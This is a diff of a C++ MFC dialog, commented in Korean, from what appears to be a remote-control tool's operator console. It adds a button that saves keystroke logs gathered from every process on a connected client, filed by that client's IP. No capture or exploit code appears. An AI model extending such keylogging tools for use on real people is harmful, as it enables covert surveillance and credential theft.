@@ -13,7 +13,7 @@
 
 IMPLEMENT_DYNAMIC(CClient, CDialogEx)
 
-CClient::CClient(CWnd* pParent /*=nullptr*/)
+CClient::CClient(int no, CWnd* pParent /*=nullptr*/)
 	: CDialogEx(IDD_DIALOG_CLIENT, pParent)
 	, m_msg_kind(0)
 	, m_command(_T(""))
@@ -23,6 +23,7 @@ CClient::CClient(CWnd* pParent /*=nullptr*/)
 	, m_check_font_underlined(FALSE)
 	, m_check_font_strike(FALSE)
 	, m_edit_command_delay(NORMAL_COMMAND_DELAY)
+	, no(no)
 {
 	memset(m_font.lfFaceName, 0, 31 * sizeof(WCHAR));
 }
@@ -61,6 +62,7 @@ BEGIN_MESSAGE_MAP(CClient, CDialogEx)
 	ON_BN_CLICKED(IDC_CHECK_FONT_UNDERLINED, &CClient::OnBnClickedCheckUnderlined)
 	ON_BN_CLICKED(IDC_CHECK_FONT_STRIKE, &CClient::OnBnClickedCheckFontStrike)
 	ON_NOTIFY(UDN_DELTAPOS, IDC_SPIN_COMMAND_DELAY, &CClient::OnDeltaposSpinCommandDelay)
+	ON_BN_CLICKED(IDC_BUTTON_SAVE_KEYLOGS, &CClient::OnBnClickedButtonSaveKeylogs)
 END_MESSAGE_MAP()
 
 
@@ -373,7 +375,7 @@ void CClient::OnClickedRadioMsgKind(UINT uid)
 	}
 }
 
-// 딜레이 값 올리기, 내리기 이벤트
+/* 딜레이 값 올리기, 내리기 이벤트 */
 void CClient::OnDeltaposSpinCommandDelay(NMHDR *pNMHDR, LRESULT *pResult)
 {
 	LPNMUPDOWN pNMUpDown = reinterpret_cast<LPNMUPDOWN>(pNMHDR);
@@ -391,7 +393,7 @@ void CClient::OnDeltaposSpinCommandDelay(NMHDR *pNMHDR, LRESULT *pResult)
 	UpdateData(FALSE);
 }
 
-// UpdateData(TRUE)를 하기 전 필수 입력 칸이 비어있는지 검사하고 비어있으면 이전 값으로 초기화 수행
+/* UpdateData(TRUE)를 하기 전 필수 입력 칸이 비어있는지 검사하고 비어있으면 이전 값으로 초기화 수행 */
 void CClient::CheckEditsEmpty()
 {
 	// TODO: 여기에 구현 코드 추가.
@@ -413,4 +415,23 @@ void CClient::CheckEditsEmpty()
 			GetDlgItem(resource_id[i])->SetWindowTextW(str);
 		}
 	}
+}
+
+void CClient::OnBnClickedButtonSaveKeylogs()
+{
+	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
+	MessageBox(_T("저장되었습니다"), _T("확인"), MB_OK);
+	SaveKeylogs();
+}
+
+/* 모든 프로세스의 키로그 모두 저장 */
+void CClient::SaveKeylogs()
+{
+	// TODO: 여기에 구현 코드 추가.
+	CString IP;
+	UINT port;
+	socket->GetPeerName(IP, port);
+
+	for (int i = 0; i < m_keylogs.size(); i++)
+		m_keylogs[i]->SaveKeylog(IP, no);
 }
